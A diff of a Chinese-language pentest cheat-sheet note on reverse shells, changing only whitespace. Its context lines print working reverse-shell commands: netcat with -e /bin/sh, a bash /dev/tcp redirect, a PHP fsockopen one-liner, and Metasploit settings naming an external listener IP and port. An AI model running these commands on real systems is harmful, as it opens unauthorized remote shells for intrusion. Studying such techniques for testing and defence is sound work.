@@ -1,7 +1,7 @@
-<!-- 
+<!--
 title: 08-反弹shell
-sort: 
---> 
+sort:
+-->
 
 ## 基本
 
@@ -14,7 +14,7 @@ nc 192.168.72.128 23333			# 客户端
 nc -lvp 23333								# 服务端
 nc -lvnp 23333							# 阿里报错
 # 客户端
-nc <ip> <port> -e /bin/sh		
+nc <ip> <port> -e /bin/sh
 bash -i >& /dev/tcp/ip/23333 0>&1
 # php
 php -r '$f=fsockopen("ip",port);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -47,4 +47,3 @@ set lhost 39.106.106.202
 set lport 7777
 run
 ```
-
